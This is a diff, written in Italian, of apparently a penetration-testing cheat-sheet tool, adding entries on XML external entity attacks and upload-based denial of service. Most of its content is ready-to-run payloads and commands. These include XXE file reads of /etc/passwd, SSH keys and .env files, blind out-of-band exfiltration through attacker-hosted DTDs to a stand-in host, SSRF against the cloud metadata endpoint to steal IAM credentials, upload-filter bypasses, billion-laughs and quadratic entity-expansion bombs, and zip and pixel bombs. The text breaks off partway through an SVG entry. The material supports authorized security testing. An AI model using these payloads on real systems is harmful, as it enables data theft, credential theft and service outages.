+    "note": "# Output atteso\nIl file compare dove l’app riflette l’entità (sostituisci `<xxe-root>` con il campo reale). Se non torna nulla è blind: vai a «XXE — Blind/OOB».\n# Scaletta WAF (dal semplice)\n1. `SYSTEM` diretto\n2. `PUBLIC \"id\" \"url\"` se `SYSTEM` è filtrato\n3. UTF-16BE o UTF-7 se filtra le firme ASCII\n4. offuscamento del DOCTYPE (newline, commenti) per le regex deboli\n# Bersagli utili\n`/etc/passwd`, sorgenti via `php://filter`, `.env`, `web.config`, `/proc/self/environ`, chiavi SSH (`/home/<user>/.ssh/id_rsa`).",
+    "refs": [
+      {
+        "label": "PortSwigger — XXE",
+        "url": "https://portswigger.net/web-security/xxe"
+      },
+      {
+        "label": "HackTricks — XXE",
+        "url": "https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html"
+      }
+    ]
+  },
+  {
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "XXE",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "id": "xxe-oob",
+    "name": "XXE — Blind / OOB & error-based",
+    "description": "Nessun output in risposta: esfiltri fuori banda verso un tuo listener, o leggi i dati nei messaggi d’errore. Include il local DTD per i casi senza alcuna connettività in uscita.",
+    "tags": [
+      "xxe",
+      "xml",
+      "oob",
+      "blind"
+    ],
+    "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/xxe.dtd\">\n  %dtd;\n  %send;\n]>",
     "params": [
       {
         "key": "lhost",
@@ -9865,31 +10089,389 @@ const COMMANDS = [
     ],
     "variants": [
       {
-        "id": "default",
-        "label": "Basic (file read)",
-        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<xxe-root>&xxe;</xxe-root>",
-        "description": "Legge `/etc/passwd` se l’app riflette il valore dell’entità in risposta."
-      },
-      {
-        "id": "blind",
-        "label": "Blind OOB",
-        "template": "<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/xxe.dtd\">\n  %dtd;\n]>\n<xxe-root>&send;</xxe-root>",
-        "description": "`xxe.dtd` ospitato da te: `<!ENTITY send SYSTEM \"http://<lhost>/?data=%file;\">`, esfiltra via HTTP quando l’output non è mostrato."
+        "id": "oob-http",
+        "label": "OOB HTTP",
+        "template": "# 1) DTD malevolo sul tuo host. &#x25; = '%' XML-encoded: annida la dichiarazione di send\ncat > xxe.dtd <<'EOF'\n<!ENTITY % eval \"<!ENTITY &#x25; send SYSTEM 'http://<lhost>/?x=%file;'>\">\n%eval;\nEOF\n\n# 2) listener in un terminale a parte; i dati arrivano nel parametro ?x= (base64)\npython3 -m http.server 80\n\n# 3) invia il payload all'endpoint; nei log leggi ?x= e decodifica con: base64 -d\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/xxe.dtd\">\n  %dtd;\n  %send;\n]>",
+        "description": "Blind: la risposta non riflette nulla, i dati arrivano sul tuo host. Le parameter entity annidate (`&#x25;` = `%`) dichiarano `send` a runtime — obbligatorie, perché un parser non espande `%` dentro una dichiarazione del subset interno. `php://filter` incapsula il file in base64 così passa intatto nella query string."
       },
       {
         "id": "error",
         "label": "Error-based",
-        "template": "<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/xxe.dtd\">\n  %dtd;\n]>",
-        "description": "Il dtd remoto usa un’entità non valida per far comparire il contenuto del file nel messaggio d’errore."
+        "template": "# 1) DTD sul tuo host: dirotta il file in un path inesistente -> finisce nel messaggio di errore\ncat > error.dtd <<'EOF'\n<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\nEOF\n\n# 2) servi il DTD via HTTP (un terminale a parte): qui NON ricevi dati, servono solo a consegnare il DTD\npython3 -m http.server 80\n\n# 3) invia il payload all'endpoint e leggi il contenuto del file nel messaggio di errore della risposta\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/error.dtd\">\n  %dtd;\n  %error;\n]>",
+        "description": "Quando le connessioni HTTP in uscita sono filtrate ma gli errori di parsing tornano in risposta. Il file dirottato in un path inesistente compare nel messaggio di errore. Il DTD va comunque servito via HTTP: il parser lo scarica, è `file://` solo l'esfiltrazione."
+      },
+      {
+        "id": "local-dtd",
+        "label": "Local DTD",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % local SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n  <!ENTITY % ISOamso '\n    <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\n    <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///x/&#x25;file;&#x27;>\">\n    &#x25;eval; &#x25;err;\n  '>\n  %local;\n]>",
+        "description": "Nessuna connettività in uscita: riusa un DTD già sul target e ridefinisci una sua parameter entity per un error-based tutto locale. `ISOamso` esiste in `docbookx.dtd`; il contenuto di `%file;` compare nell’errore. Altri DTD nella nota."
+      },
+      {
+        "id": "ftp",
+        "label": "OOB FTP",
+        "template": "# 1) DTD sul tuo host: esfiltra via FTP (cattura dati multilinea, senza base64)\ncat > ftp.dtd <<'EOF'\n<!ENTITY % eval \"<!ENTITY &#x25; send SYSTEM 'ftp://<lhost>:2121/%file;'>\">\n%eval;\nEOF\n\n# 2) servi il DTD via HTTP (un terminale)\npython3 -m http.server 80\n\n# 3) server FTP fittizio che logga i path richiesti = i dati (altro terminale)\nxxeserv -p 2121 -w -o ftp.log        # oppure: python3 -m pyftpdlib -p 2121 -w\n\n# 4) invia il payload all'endpoint\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/ftp.dtd\">\n  %dtd;\n  %send;\n]>",
+        "description": "HTTP tronca su newline e caratteri speciali; FTP cattura dati multilinea senza passare da base64. Servi il DTD via HTTP e ricevi i path (cioè i dati) su un server FTP fittizio (`xxeserv`, `pyftpdlib`) su una porta alta."
       }
     ],
+    "note": "# Quale variante\n- ricevi connessioni → OOB via HTTP (il più comune)\n- HTTP in uscita filtrato, errori visibili → error-based\n- nessuna connettività in uscita → local DTD (tutto sul target)\n- dati multilinea / caratteri che rompono l’URL → OOB via FTP\n# Il tuo listener\n- HTTP: `python3 -m http.server 80`, poi `base64 -d` sul valore ricevuto\n- FTP: server FTP fittizio su una porta alta (2121) che logga il path richiesto\n# DTD locali comuni\n- Linux: `file:///usr/share/yelp/dtd/docbookx.dtd` → entità `ISOamso`\n- Linux (alt): `file:///usr/share/xml/fontconfig/fonts.dtd` → `constant`\n- Windows: `file:///C:/Windows/System32/wbem/xml/cim20.dtd` → `SuperClass`\n# Attenzione\n`&#x25;` è `%` XML-encoded: serve a dichiarare un’entità DENTRO una parameter entity. Senza l’annidamento l’OOB non parte.",
     "refs": [
+      {
+        "label": "PortSwigger — XXE",
+        "url": "https://portswigger.net/web-security/xxe"
+      },
       {
         "label": "HackTricks — XXE",
         "url": "https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html"
       }
+    ]
+  },
+  {
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "XXE",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
     ],
-    "note": "# Output atteso\nIl contenuto del file richiesto compare nella risposta (in-band). Se la risposta non riflette l'entità (blind), usa la variante OOB: un'entità esterna che richiama un DTD sul tuo host ed esfiltra i dati.\n# Prerequisiti\nIl parser XML deve risolvere le entità esterne (DTD non disabilitati). CDATA serve per i file con caratteri speciali.\n# Prossimo passo\nLeggi config e chiavi; su PHP valuta `php://filter` per i sorgenti; l'entità può anche puntare a servizi interni (SSRF)."
+    "protocols": [
+      "http"
+    ],
+    "id": "xxe-ssrf",
+    "name": "XXE — SSRF & protocolli",
+    "description": "L’entità esterna fa partire richieste DAL server: servizi interni, metadata cloud, port scan, e con certi wrapper RCE o smuggling TCP.",
+    "tags": [
+      "xxe",
+      "xml",
+      "ssrf"
+    ],
+    "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/admin\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "Tuo host",
+        "placeholder": "10.10.14.5"
+      }
+    ],
+    "variants": [
+      {
+        "id": "internal",
+        "label": "Interno",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/admin\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+        "description": "Raggiungi servizi non esposti (`localhost`, IP privati, pannelli interni). Se l’output è riflesso leggi la risposta; altrimenti è SSRF blind (vedi sotto)."
+      },
+      {
+        "id": "cloud",
+        "label": "Metadata",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+        "description": "Il server interroga per te l’endpoint metadata del cloud:\n<ul><li><strong>AWS</strong> — <code>169.254.169.254/latest/meta-data/</code> → ruba le credenziali IAM temporanee.</li><li><strong>GCP / Azure</strong> — richiedono header (<code>Metadata-Flavor: Google</code>, <code>Metadata: true</code>) che via XXE di solito non puoi impostare.</li></ul>"
+      },
+      {
+        "id": "portscan",
+        "label": "Port scan",
+        "template": "# varia la porta (Burp Intruder sul marker PORT) e osserva tempi/errori\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:PORT/\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+        "description": "Risposte/tempi diversi distinguono porte aperte, chiuse e filtrate → mappa i servizi interni. Fuzz di `PORT` con Intruder."
+      },
+      {
+        "id": "blind-ssrf",
+        "label": "Blind",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://<lhost>/probe\"> %xxe; ]>",
+        "description": "Nessun output riflesso: confermi la SSRF ricevendo la richiesta sul tuo listener (`nc -lvnp 80`). Per esfiltrare dati interni combina con la logica OOB o un redirect."
+      },
+      {
+        "id": "protocols",
+        "label": "Wrapper",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"expect://id\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+        "description": "Oltre a `file` e `http`, altri wrapper secondo parser e linguaggio:\n<ul><li><strong>PHP</strong> — <code>expect://</code> → RCE (raro), <code>data://</code>, <code>php://input</code>.</li><li><strong>Java</strong> — <code>jar:</code>, <code>netdoc:</code>.</li><li><strong>gopher://</strong> — smuggling TCP verso Redis o SMTP interni.</li></ul>"
+      }
+    ],
+    "note": "# Riflesso vs blind\nOutput in risposta → leggi direttamente. Niente output → SSRF blind: conferma sul tuo listener e usa la logica OOB per portare fuori i dati.\n# Wrapper per linguaggio\n- PHP: `php://filter`, `expect://` (RCE, raro), `data://`, `php://input`\n- Java: `http`, `file`, `ftp`, `jar:`, `netdoc:`\n- `gopher://`: smuggling di richieste TCP arbitrarie (Redis, SMTP, ecc.)\n# Attenzione\nPort scan interno, `expect://` e `gopher://` sono intrusivi: solo nel perimetro autorizzato.",
+    "refs": [
+      {
+        "label": "PortSwigger — XXE",
+        "url": "https://portswigger.net/web-security/xxe"
+      },
+      {
+        "label": "HackTricks — XXE",
+        "url": "https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html"
+      }
+    ]
+  },
+  {
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "XXE",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "id": "xxe-vectors",
+    "name": "XXE — Vettori d'ingresso",
+    "description": "Dove iniettare XML quando non c’è un body `.xml` ovvio:\n<ul><li><strong>XInclude</strong> — il tuo input finisce in un XML costruito dal server.</li><li><strong>SVG / Office</strong> — file caricati che vengono parsati a valle.</li><li><strong>SOAP / SAML</strong> — web service e asserzioni d’identità.</li><li><strong>JSON→XML</strong> — API che accettano anche <code>application/xml</code>.</li></ul>",
+    "tags": [
+      "xxe",
+      "xml",
+      "upload"
+    ],
+    "template": "<root-xi xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <xi:include parse=\"text\" href=\"file:///etc/passwd\"/>\n</root-xi>",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "file",
+        "label": "File OOXML",
+        "placeholder": "template.docx"
+      }
+    ],
+    "variants": [
+      {
+        "id": "xinclude",
+        "label": "XInclude",
+        "template": "<root-xi xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <xi:include parse=\"text\" href=\"file:///etc/passwd\"/>\n</root-xi>",
+        "description": "Quando il tuo input finisce dentro un XML costruito dal server e non puoi dichiarare un DOCTYPE/entità. `parse=\"text\"` legge come testo; per i sorgenti metti `php://filter` nell’`href`."
+      },
+      {
+        "id": "svg",
+        "label": "SVG",
+        "template": "<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\"> ]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"300\" height=\"60\">\n  <text x=\"0\" y=\"20\">&xxe;</text>\n</svg>",
+        "description": "Carica l’SVG dove l’app lo processa (avatar, conversione immagini, anteprime): il contenuto del file appare nel testo renderizzato. Colpisce anche parser SVG lato server."
+      },
+      {
+        "id": "ooxml",
+        "label": "OOXML",
+        "template": "# .docx/.xlsx/.pptx = archivi zip di XML\nunzip -o <file> -d ooxml && cd ooxml\n\n# in word/document.xml (o [Content_Types].xml) aggiungi in cima la DTD:\n#   <!DOCTYPE x [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n# e inserisci &xxe; dentro un nodo di testo gia' presente\n\n# ricompatta e caricalo al posto dell'originale\nzip -r ../evil.docx . >/dev/null && cd ..",
+        "description": "I formati Office sono zip di XML: inietti in un `.xml` interno, ricompatti e carichi. Efficace contro convertitori di documenti e parser di upload."
+      },
+      {
+        "id": "soap",
+        "label": "SOAP",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE soap:Envelope [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body><data-x>&xxe;</data-x></soap:Body>\n</soap:Envelope>",
+        "description": "I web service SOAP parsano XML: inietti la DTD nell’Envelope. Spesso i parametri del backend SOAP sono meno filtrati del frontend."
+      },
+      {
+        "id": "content-type",
+        "label": "JSON→XML",
+        "template": "# endpoint che parsa JSON: ritenta come XML cambiando il Content-Type\ncurl -s http://<ip>/api/endpoint \\\n  -H 'Content-Type: application/xml' \\\n  --data '<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root-x>&xxe;</root-x>'",
+        "description": "Molte API accettano XML anche quando il client manda JSON. Se il JSON non è iniettabile, cambia `Content-Type` in `application/xml` e manda un body XML con la DTD."
+      }
+    ],
+    "note": "# Dove parsa XML il server?\nAnche senza un campo XML esplicito: upload di immagini e documenti (SVG, Office), SOAP, REST con `application/xml`, RSS/Atom, sitemap, SAML, config import.\n# XInclude vs DOCTYPE\nControlli tutto il documento → DOCTYPE + entità (più potente). Il tuo input è solo un valore dentro un XML del server → XInclude, che non richiede DOCTYPE.\n# SAML\nLa Response SAML è XML in base64/deflate: decodificala, inietti la DTD, ricodificala. La firma spesso non è verificata prima del parsing.\n# Prossimo passo\nLettura ok → punta a sorgenti e segreti; blind → «XXE — Blind/OOB».",
+    "refs": [
+      {
+        "label": "PortSwigger — XXE",
+        "url": "https://portswigger.net/web-security/xxe"
+      },
+      {
+        "label": "HackTricks — XXE",
+        "url": "https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html"
+      }
+    ]
+  },
+  {
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "XXE",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "id": "xxe-upload",
+    "name": "XXE — Upload & casi particolari",
+    "description": "Casi che le altre schede non coprono: far passare il payload oltre i filtri di upload, enumerare directory, e lo stored/second-order XXE dove il parsing è differito.",
+    "tags": [
+      "xxe",
+      "xml",
+      "upload",
+      "bypass"
+    ],
+    "template": "# il validatore controlla magic bytes / estensione / Content-Type: mascheralo\nprintf 'GIF89a' | cat - payload.svg > evil.svg\n\n# invia come immagine (estensione + MIME d'immagine)\ncurl -s -F 'file=@evil.svg;type=image/svg+xml' http://<ip>/upload",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "lhost",
+        "label": "Tuo host",
+        "placeholder": "10.10.14.5"
+      }
+    ],
+    "variants": [
+      {
+        "id": "upload-bypass",
+        "label": "Magic bytes",
+        "template": "# il validatore controlla magic bytes / estensione / Content-Type: mascheralo\nprintf 'GIF89a' | cat - payload.svg > evil.svg\n\n# invia come immagine (estensione + MIME d'immagine)\ncurl -s -F 'file=@evil.svg;type=image/svg+xml' http://<ip>/upload",
+        "description": "Anteponi un magic header (`GIF89a`, `\\x89PNG`) al payload XML/SVG, oppure forza estensione/MIME d’immagine. I parser SVG/XML tolleranti saltano il preambolo; molte pipeline estraggono comunque l’XML. Prova doppia estensione (`.svg.png`). `payload.svg` è il payload della scheda «Vettori»."
+      },
+      {
+        "id": "dir-listing",
+        "label": "Dir listing",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///opt/\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+        "description": "Su parser Java (e alcuni altri) `file:///` su una DIRECTORY restituisce l’elenco dei file: enumera `file:///`, `file:///home/`, `file:///opt/` prima di leggere i file trovati. Su PHP/.NET di norma non funziona."
+      },
+      {
+        "id": "stored",
+        "label": "Stored",
+        "template": "# XXE stored: stesso OOB di «Blind/OOB», ma il payload viene SALVATO e parsato più tardi\n# (profilo, feed, documento importato) da un altro componente -> resta solo il canale OOB\n\n# 1) DTD sul tuo host (esfiltra il file via HTTP)\ncat > x.dtd <<'EOF'\n<!ENTITY % eval \"<!ENTITY &#x25; send SYSTEM 'http://<lhost>/?x=%file;'>\">\n%eval;\nEOF\n\n# 2) listener in un terminale a parte: i dati possono arrivare con minuti/ore di ritardo\npython3 -m http.server 80\n\n# 3) salva questo payload nel campo che verrà riparsato dopo\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/x.dtd\">\n  %dtd;\n  %send;\n]>",
+        "description": "Il payload è salvato (profilo, feed, documento importato) e parsato PIÙ TARDI da un altro componente (job batch, pannello admin, report). La request immediata non mostra nulla: l'XXE scatta al secondo parsing, quindi l'unico canale è l'OOB. Stessa meccanica di «Blind/OOB», ma la ricezione è asincrona."
+      }
+    ],
+    "note": "# Come passa il filtro di upload\n- estensione: rinomina (`.svg`), doppia estensione (`.svg.png`), maiuscole\n- magic bytes: anteponi `GIF89a` o `\\x89PNG` al payload XML/SVG\n- Content-Type: forza `image/svg+xml` o `application/xml`\nIl componente a valle (thumbnailer, converter, antivirus, indicizzatore) spesso ignora il preambolo e processa l’XML.\n# Altri formati che portano XXE\n- feed: RSS/Atom (`<rss>`, `<feed>`)\n- documenti: DOCX/XLSX/PPTX (vedi «Vettori»), ODF, EPUB\n- dati geo: GPX, KML; metadati: XMP dentro JPEG/PDF/TIFF\n- servizi/config: WSDL, SOAP, plist (Apple), AndroidManifest\n# Esfiltrazione DNS (egress ristretto)\nSe esce solo il DNS, metti il dato in un sottodominio verso il tuo DNS autoritativo e leggi le query (interactsh, `tcpdump`). Adatto a pochi byte (hostname, un flag): i dati lunghi o multilinea non passano nel DNS.",
+    "refs": [
+      {
+        "label": "PortSwigger — XXE",
+        "url": "https://portswigger.net/web-security/xxe"
+      },
+      {
+        "label": "HackTricks — XXE",
+        "url": "https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html"
+      }
+    ]
+  },
+  {
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "XXE",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "id": "xxe-dos",
+    "name": "XML — Entity expansion DoS",
+    "description": "Test di disponibilità (CWE-776): l’espansione delle entità satura CPU e RAM del parser.\n<ul><li><strong>Billion laughs</strong> — annidamento esponenziale, x10 a ogni livello.</li><li><strong>Quadratic blowup</strong> — una grande entità ripetuta molte volte, aggira i limiti di profondità.</li><li><strong>External</strong> — entità verso una risorsa infinita o un URL che non risponde mai.</li></ul>\nIntrusivo: è un vero DoS, vedi gli avvisi nelle note.",
+    "tags": [
+      "xml",
+      "dos",
+      "billion-laughs"
+    ],
+    "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n  <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n]>\n<lolz-root>&lol5;</lolz-root>",
+    "params": [],
+    "variants": [
+      {
+        "id": "billion-laughs",
+        "label": "Billion laughs",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n  <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n]>\n<lolz-root>&lol5;</lolz-root>",
+        "description": "Ogni livello moltiplica x10: 5 livelli = 100k \"lol\" (innocuo, per CONFERMARE l’espansione). Aggiungi `lol6`…`lol9` solo dopo: `&lol9;` ≈ 10^9 nodi (~3 GB). Parti sempre dal basso e misura l’impatto."
+      },
+      {
+        "id": "quadratic",
+        "label": "Quadratic",
+        "template": "# 1 entità grande (50k) richiamata 20k volte: ~1 GB in RAM, pochi KB sul filo\npython3 - <<'PYEOF' > bomb.xml\nbody = 'a' * 50000\ncalls = '&a;' * 20000\nprint('<?xml version=\"1.0\"?><!DOCTYPE b [<!ENTITY a \"' + body + '\">]><b-root>' + calls + '</b-root>')\nPYEOF",
+        "description": "Annidamento 1 → aggira i limiti sulla PROFONDITÀ di espansione che fermano billion laughs. Payload più grande da trasmettere ma elude molte difese. Alza gradualmente `50000`/`20000` misurando CPU/RAM."
+      },
+      {
+        "id": "external",
+        "label": "External",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///dev/random\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+        "description": "Entità esterna verso una risorsa infinita/grande (`/dev/random`, `/dev/zero`, un file enorme) → il parser si blocca o esaurisce la memoria. Variante SSRF: URL interno che non risponde mai (hang)."
+      },
+      {
+        "id": "param-recursion",
+        "label": "Param entity",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE r [\n  <!ENTITY % a \"dos\">\n  <!ENTITY % b \"%a;%a;%a;%a;%a;%a;%a;%a;%a;%a;\">\n  <!ENTITY % c \"%b;%b;%b;%b;%b;%b;%b;%b;%b;%b;\">\n  <!ENTITY % d \"%c;%c;%c;%c;%c;%c;%c;%c;%c;%c;\">\n  %d;\n]>",
+        "description": "Stessa espansione ma con parameter entity (`%`), dove le entità generali sono filtrate. Nota: molti parser le espandono già nel DTD, quindi l’effetto può scattare al parse del DOCTYPE, senza root element."
+      }
+    ],
+    "note": "# Cosa testi\nLa resilienza del parser all’espansione di entità. Billion laughs = esponenziale (livelli annidati). Quadratic blowup = una grande entità richiamata molte volte (aggira i limiti di profondità). External = entità verso risorse infinite.\n# Dimostrarlo SENZA downtime\n- parti dal payload minimo (pochi livelli / poche ripetizioni) e misura tempo di risposta, CPU, RAM\n- la sola crescita NON lineare prova il difetto: non serve saturare\n- fermati appena noti degradazione; non lanciare il payload full\n- invia con `curl --data-binary @bomb.xml -H 'Content-Type: application/xml' http://TARGET/endpoint`\n# Difese che negano il bug\n`entityExpansionLimit` (Java/JAXP), limiti libxml, entità disabilitate: un parser che le applica regge. Se un payload piccolo già degrada, è vulnerabile.\n# Attenzione\nQuesto È un DoS: può rendere il servizio indisponibile. Usalo SOLO con autorizzazione esplicita, come test di disponibilità concordato, preferibilmente su staging/in finestra, con il payload minimo che dimostra il difetto.",
+    "refs": [
+      {
+        "label": "OWASP — XML Entity Expansion",
+        "url": "https://owasp.org/www-community/vulnerabilities/XML_Entity_Expansion"
+      },
+      {
+        "label": "HackTricks — XXE",
+        "url": "https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html"
+      }
+    ]
+  },
+  {
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "XXE",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "id": "file-bombs",
+    "name": "File bombs — DoS via upload",
+    "description": "Test di disponibilità via upload (CWE-409/400): un file piccolo satura CPU e RAM del componente che lo spacchetta o lo renderizza — estrattori, thumbnailer, convertitori, transcoder. Come `xxe-dos`: parti dal payload minimo e misura la crescita, non serve il downtime.",
+    "tags": [
+      "dos",
+      "upload",
+      "decompression-bomb"
+    ],
+    "template": "# 1 GB di zeri comprime a pochi MB: lo decomprime chi spacchetta l’upload\ndd if=/dev/zero bs=1M count=1024 of=bomb.bin\nzip -q bomb.zip bomb.bin && rm bomb.bin\n\n# consegna come formato-zip che il server parsa davvero (OOXML/ODF/EPUB sono zip)\ncp bomb.zip bomb.docx",
+    "params": [],
+    "variants": [
+      {
+        "id": "zip",
+        "label": "Zip bomb",
+        "template": "# 1 GB di zeri comprime a pochi MB: lo decomprime chi spacchetta l’upload\ndd if=/dev/zero bs=1M count=1024 of=bomb.bin\nzip -q bomb.zip bomb.bin && rm bomb.bin\n\n# consegna come formato-zip che il server parsa davvero (OOXML/ODF/EPUB sono zip)\ncp bomb.zip bomb.docx",
+        "description": "Un archivio che decomprime in GB da pochi MB. Colpisce chi lo spacchetta: estrattori, scanner AV, e tutti i parser di formati-zip (`.docx`/`.xlsx`/`.pptx`, ODF, EPUB, JAR).\n<ul><li><strong>Flat</strong> — un solo file enorme di zeri, come qui: semplice e già sufficiente per la demo.</li><li><strong>Annidato</strong> — zip dentro zip (o overlapping) per rapporti da petabyte: vedi i tool nelle note.</li><li><strong>Molti file</strong> — migliaia di entry → esaurisce inode, file descriptor e CPU durante l’estrazione.</li></ul>"
+      },
+      {
+        "id": "pixel-flood",
+        "label": "Pixel flood",
+        "template": "convert -size 25000x25000 xc:white flood.png",
+        "description": "Immagine minuscola che dichiara dimensioni enormi: al decode/resize il server alloca `larghezza×altezza×canali` byte → OOM. È il bug per cui Pillow ha `DecompressionBombError` e `MAX_IMAGE_PIXELS`.\n<ul><li><strong>Target</strong> — Pillow/PIL, ImageMagick, GD, libvips, qualunque thumbnailer o resizer.</li><li><strong>Animati</strong> — GIF/APNG/WebP con migliaia di frame moltiplicano l’effetto.</li></ul>"
+      },
+      {
+        "id": "svg",
+        "label": "SVG",
